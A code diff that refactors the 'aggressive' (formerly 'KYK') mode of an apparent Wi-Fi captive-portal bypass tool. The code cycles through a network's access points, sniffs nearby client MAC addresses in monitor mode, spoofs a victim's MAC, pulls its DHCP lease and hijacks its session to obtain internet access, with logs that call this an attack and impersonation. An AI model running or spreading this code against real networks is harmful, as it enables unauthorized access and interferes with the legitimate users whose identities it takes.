@@ -1,71 +1,49 @@
 """
-Library/kyk.py - Sequential multi-BSSID exploration & scanning until internet access is granted.
+cafe_chameleon.aggressive.runner - Sequential multi-BSSID exploration & scanning execution runner.
 """
 
 import sys
 import time
 
-from .utils import (
-    _run,
+from cafe_chameleon.utils.process import _run
+from cafe_chameleon.utils.signals import register_signal_handler, HijackSkipInterrupt, MainSkipInterrupt
+from cafe_chameleon.utils.state import set_restore_params
+from cafe_chameleon.ui.console import (
     log_info,
     log_plus,
     log_warning,
-    log_minus,
     log_main,
     log_hijack,
-    clear_window,
-    set_restore_params,
-    register_signal_handler,
-    ask_proceed,
-    ask_restore
+    clear_window
 )
-from .adapter import (
-    has_internet,
-    wait_for_carrier,
-    hijack,
-    restore,
-    query_dhcp_lease_ip
-)
-from .scanner import run_scan, auto_detect_network_params, resolve_mac_to_ip
-
-from .wifi import (
+from cafe_chameleon.ui.prompts import ask_proceed, ask_restore
+from cafe_chameleon.network.internet import has_internet
+from cafe_chameleon.network.sysfs import wait_for_carrier
+from cafe_chameleon.network.hijack import hijack, restore
+from cafe_chameleon.network.dhcp import query_dhcp_lease_ip
+from cafe_chameleon.network.mac import set_mac_address
+from cafe_chameleon.network.nmcli import (
     get_active_profile,
     get_ssid_for_profile,
     scan_bssids_for_ssid,
     lock_bssid,
     restore_auto
 )
+from cafe_chameleon.scanners.detector import auto_detect_network_params
+from cafe_chameleon.scanners.resolver import resolve_mac_to_ip
+from cafe_chameleon.scanners.air_scanner import sniff_air_clients
+from cafe_chameleon.aggressive.ranker import calculate_bssid_score
 
-from .air_scanner import sniff_air_clients
+
+def run_scan_wrapper(args, quiet_header=False):
+    """Deferred import to avoid circular dependency with simple scan runner."""
+    from cafe_chameleon.cli.commands.simple import run_simple
+    return run_simple(args, quiet_header=quiet_header)
 
 
-def calculate_bssid_score(bssid_item, air_clients_map=None):
+def run_aggressive(args) -> bool:
     """
-    Calculates auto-selection score for a BSSID based on:
-    1. Number of captured clients (the more clients, the higher score / priority)
-    2. Signal strength percentage (the better signal, the higher score)
-    """
-    bssid_mac = bssid_item["bssid"].lower()
-
-    try:
-        import re
-        signal_pct = int(re.sub(r"[^\d]", "", str(bssid_item.get("signal", 0))))
-    except Exception:
-        signal_pct = 0
-
-    client_count = 0
-    if air_clients_map and bssid_mac in air_clients_map:
-        client_count = len(air_clients_map[bssid_mac])
-
-    # Score formula: Heavily weight client count so BSSIDs with clients rank first,
-    # and break ties/rank remaining BSSIDs using signal strength percentage.
-    score = (client_count * 1000) + signal_pct
-    return score, client_count, signal_pct
-
-
-def run_kyk(args):
-    """
-    Main subcommand handler for KYK mode.
+    Main subcommand handler for Aggressive mode.
     Connects to each available BSSID for the target SSID one by one,
     checking for internet access or scanning until internet access is granted.
     Supports --air over-the-air 802.11 monitor mode client discovery & direct takeover.
@@ -99,7 +77,7 @@ def run_kyk(args):
                 pass
 
     log_main("========================================", clear=True)
-    log_main("       KYK MULTI-BSSID EXPLORATION      ")
+    log_main("    AGGRESSIVE MULTI-BSSID EXPLORATION  ")
     log_main("========================================")
     log_main(f"Interface      : {interface}")
     log_main(f"Active Profile : {profile}")
@@ -190,15 +168,18 @@ def run_kyk(args):
             log_main(f"\n{msg}")
 
             # Lock connection to this BSSID
-            lock_bssid(target_bssid, profile)
+            if not lock_bssid(target_bssid, profile):
+                log_warning(f"Skipping BSSID {target_bssid} because connection lock failed after 3 attempts.")
+                log_main(f"[!] Skipping BSSID {target_bssid} (connection lock failed).")
+                continue
 
             # Wait deterministically for adapter link readiness
             wait_for_carrier(interface, timeout=6.0)
 
             # Check if internet access is available immediately
             if has_internet():
-                log_plus(f"KYK SUCCESS! Internet verified on BSSID {target_bssid}!")
-                log_main(f"\033[92m[+] KYK SUCCESS! Internet verified on BSSID {target_bssid}!\033[0m")
+                log_plus(f"AGGRESSIVE SUCCESS! Internet verified on BSSID {target_bssid}!")
+                log_main(f"\033[92m[+] AGGRESSIVE SUCCESS! Internet verified on BSSID {target_bssid}!\033[0m")
                 if not getattr(args, "force", False):
                     return True
                 else:
@@ -231,44 +212,49 @@ def run_kyk(args):
                 local_mac = auto_params.get("local_mac", "")
                 ipmask = auto_params.get("cidr", f"{auto_ip}/{netmask}")
 
-                set_restore_params(interface, local_mac, ipmask, broadcast, gw_ip, callback=restore)
+                set_restore_params(interface, local_mac, ipmask, broadcast, gw_ip, callback=restore, profile=profile)
 
                 for client_mac, client_ip in new_air_clients.items():
-                    tried_macs.add(client_mac.lower())
+                    try:
+                        tried_macs.add(client_mac.lower())
 
-                    resolved_ip = client_ip or resolve_mac_to_ip(client_mac, interface, target_subnet=auto_params.get("cidr"))
-                    
-                    # Guaranteed IP Resolution via DHCP Lease Query after MAC spoofing
-                    if not resolved_ip:
-                        log_info(f"Querying DHCP lease for air target MAC {client_mac}...")
-                        log_hijack(f"[*] Querying DHCP lease for air target MAC {client_mac}...")
-                        _run(f"ip link set dev {interface} down", debug=False)
-                        _run(f"macchanger -m {client_mac} {interface}", debug=False)
-                        _run(f"ip link set dev {interface} up", debug=False)
-                        wait_for_carrier(interface, timeout=5.0)
-                        resolved_ip = query_dhcp_lease_ip(interface)
+                        resolved_ip = client_ip or resolve_mac_to_ip(client_mac, interface, target_subnet=auto_params.get("cidr"))
+                        
+                        # Guaranteed IP Resolution via DHCP Lease Query after MAC spoofing
+                        if not resolved_ip:
+                            log_info(f"Querying DHCP lease for air target MAC {client_mac}...")
+                            log_hijack(f"[*] Querying DHCP lease for air target MAC {client_mac}...")
+                            set_mac_address(interface, client_mac, profile=profile)
+                            if not wait_for_carrier(interface, timeout=5.0):
+                                lock_bssid(target_bssid, profile)
+                                wait_for_carrier(interface, timeout=5.0)
+                            resolved_ip = query_dhcp_lease_ip(interface, target_mac=client_mac)
 
-                    target_ip = resolved_ip or auto_ip
+                        target_ip = resolved_ip or auto_ip
 
-                    hijack_success = hijack(interface, target_ip, client_mac, netmask, broadcast, gw_ip, max_retries=2)
-                    if hijack_success:
-                        log_plus(f"KYK SUCCESS! Internet granted via {client_mac} on BSSID {target_bssid}!")
-                        log_main(f"\033[92m[+] KYK SUCCESS! Internet granted via {client_mac} on BSSID {target_bssid}!\033[0m")
-                        if not getattr(args, "force", False):
-                            return True
+                        hijack_success = hijack(interface, target_ip, client_mac, netmask, broadcast, gw_ip, max_retries=2, profile=profile, bssid=target_bssid, channel=chan)
+                        if hijack_success:
+                            log_plus(f"AGGRESSIVE SUCCESS! Internet granted via {client_mac} on BSSID {target_bssid}!")
+                            log_main(f"\033[92m[+] AGGRESSIVE SUCCESS! Internet granted via {client_mac} on BSSID {target_bssid}!\033[0m")
+                            if not getattr(args, "force", False):
+                                return True
 
-                    if getattr(args, "force", False):
-                        if not ask_proceed():
-                            log_warning("User requested to stop attack after impersonation.")
-                            log_main("[-] User requested to stop attack after impersonation.")
-                            has_acc = hijack_success or has_internet()
-                            if ask_restore(default_restore=not has_acc):
-                                restore(interface, local_mac, ipmask, broadcast, gw_ip)
-                            else:
-                                log_plus("Keeping current MAC and network configuration.")
-                            return has_acc
+                        if getattr(args, "force", False):
+                            if not ask_proceed():
+                                log_warning("User requested to stop attack after impersonation.")
+                                log_main("[-] User requested to stop attack after impersonation.")
+                                has_acc = hijack_success or has_internet()
+                                if ask_restore(default_restore=not has_acc):
+                                    restore(interface, local_mac, ipmask, broadcast, gw_ip)
+                                else:
+                                    log_plus("Keeping current MAC and network configuration.")
+                                return has_acc
 
-                    time.sleep(0.5)
+                        time.sleep(0.5)
+                    except HijackSkipInterrupt:
+                        log_hijack(f"\033[93m[-] Ctrl+C in Impersonation Engine! Skipping air target MAC {client_mac}...\033[0m")
+                        log_main(f"\033[93m[-] Skipping air target {client_mac} (Ctrl+C in Impersonation Engine)...\033[0m")
+                        continue
 
                 # Restore original interface MAC/IP after testing air targets
                 has_acc = has_internet()
@@ -288,28 +274,28 @@ def run_kyk(args):
             log_main(f"  -> Scanning subnet block on BSSID {target_bssid}...")
             log_hijack(f"[*] Moving to active subnet enumeration scan on BSSID {target_bssid}...")
             setattr(args, "interface", interface)
-            success = run_scan(args, quiet_header=True)
+            success = run_scan_wrapper(args, quiet_header=True)
 
             if success or (has_internet() and not getattr(args, "force", False)):
-                log_plus(f"KYK SUCCESS! Internet access granted via BSSID {target_bssid}!")
-                log_main(f"\033[92m[+] KYK SUCCESS! Internet access granted via BSSID {target_bssid}!\033[0m")
+                log_plus(f"AGGRESSIVE SUCCESS! Internet access granted via BSSID {target_bssid}!")
+                log_main(f"\033[92m[+] AGGRESSIVE SUCCESS! Internet access granted via BSSID {target_bssid}!\033[0m")
                 if not getattr(args, "force", False):
                     return True
 
             log_warning(f"No internet on BSSID {target_bssid}. Moving next...")
             log_main(f"  [-] No internet on BSSID {target_bssid}. Moving next...")
 
-        except KeyboardInterrupt:
+        except (KeyboardInterrupt, MainSkipInterrupt):
             now = time.time()
             if now - last_skip_time < 1.5:
-                log_warning("Double Ctrl+C detected. Exiting KYK exploration...")
-                log_main("[-] Double Ctrl+C detected. Exiting KYK exploration...")
+                log_warning("Double Ctrl+C detected. Exiting exploration...")
+                log_main("[-] Double Ctrl+C detected. Exiting exploration...")
                 restore_auto(profile)
                 raise
 
             last_skip_time = now
             log_warning(f"Ctrl+C pressed! Skipping BSSID {target_bssid}...")
-            log_main(f"\033[93m[-] Ctrl+C pressed! Skipping BSSID {target_bssid}...\033[0m")
+            log_main(f"\033[93m[-] Ctrl+C pressed in Main window! Skipping BSSID {target_bssid}...\033[0m")
             try:
                 auto_params = auto_detect_network_params(target_iface=interface)
                 gw_ip = auto_params.get("gateway_ip", "")
@@ -323,13 +309,8 @@ def run_kyk(args):
             time.sleep(0.5)
             continue
 
-    log_warning("KYK completed scanning all available BSSIDs without securing internet access.")
-    log_main("[-] KYK completed scanning all available BSSIDs without securing internet access.")
+    log_warning("Aggressive completed scanning all available BSSIDs without securing internet access.")
+    log_main("[-] Aggressive completed scanning all available BSSIDs without securing internet access.")
     log_info("Restoring auto-roaming on profile...")
     restore_auto(profile)
     return False
-
-
-
-
-
